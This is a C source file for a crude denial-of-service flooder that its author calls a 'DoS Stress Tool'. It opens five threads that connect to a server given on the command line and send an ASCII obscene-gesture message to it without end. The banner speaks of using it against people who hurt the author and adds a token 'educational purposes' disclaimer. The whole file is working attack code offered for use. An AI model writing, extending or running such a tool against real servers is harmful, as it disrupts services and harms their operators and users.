#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>

//sticker from: https://www.ascii-middle-finger.com/
//compile with:\
gcc web_fcker.c -o web_fcker -lpthread


#define default_message "....................../´¯/) \n\
....................,/¯../ \n\
.................../..../  \n\
............./´¯/'...'/´¯¯`·¸ \n\
........../'/.../..../......./¨¯\\ \n\
........('(...´...´.... ¯~/'...') \n\
........\\.................'...../ \n\
..........''...\\.......... _.·´ \n\
...........\\..............( \n\
..............\\.............\\"\



#define THREAD_COUNT 5


char web_address[32] = "";
int web_port = 0;

void welcome(void){


    puts("\n");
    printf("Your attack message to server: \n%s", default_message);



    printf("\nWelcome to 0rbianta's fck'in DoS Stress Tool. Life was getting too boring. This should come to all the idiots that hurt me Use the program for educational purposes and if you damage something, you are responsible.");
    puts("\n\n\n");
    
    sleep(2);

}

void help(void){
    printf("Maybe you can need some help about using it?\nThere is the flags and meanings:\n-t : define web server\n-p : define servers port\nYou can attack DoS(Denial-of-Service) type to websites with that tool.\nHow to run:\nexec web_fcker.c -t <server_ip> -p <server_port>"); 

    exit(1);
}



void *attack_connection(){

    pthread_t tid = pthread_self();


        struct hostent *target;
        int socket_stat = socket(AF_INET, SOCK_STREAM, 0);
        //printf("socket_stat: %d\n", socket_stat);
        if(socket_stat == -1){
            return NULL;
        }
        
        target = gethostbyname(web_address);
        if(target == NULL){
            printf("Target not found: %s:%i\n", web_address, web_port);
            return NULL;
        }

        
        struct sockaddr_in socket_addr;

        memset(&socket_addr, 0, sizeof(socket_addr));
        socket_addr.sin_family = AF_INET;
        socket_addr.sin_port = htons(web_port);
        memcpy(&socket_addr.sin_addr.s_addr, target->h_addr,
        target->h_length);

        if(!connect(socket_stat, (struct sockaddr *)&socket_addr,
        sizeof(socket_addr))){


            printf("\x1b[32m"
                "Thread id: %ld CONNECTED. Attacking...\n", tid);

            unsigned int psent = 0;

            for(;;){
                printf("\x1b[32m"
                "Thread id: %ld sent %i packages to %s:%i\n", tid, psent, web_address, web_port);
                
                write(socket_stat, default_message, 100);
                psent++;
            }

        }
    

}


int main(int argc, char *argv[]){

    welcome();

    for(int i = 0;i < argc;i++){
        if(!strcmp(argv[i], "-t") && argc > i + 1)
            strncpy(web_address, argv[i + 1], sizeof(web_address));
        if(!strcmp(argv[i], "-p") && argc > i + 1)
            web_port = atoi(argv[i + 1]);

    }

    if(strlen(web_address) > 0 && web_port != 0){
        

        pthread_t tid[THREAD_COUNT];

        for(int i = 0;i < THREAD_COUNT;i++)
            pthread_create(&tid[i], NULL, attack_connection, NULL);
        
        


        pthread_exit(NULL);    


    }else
        help();
    


    return 0;
}


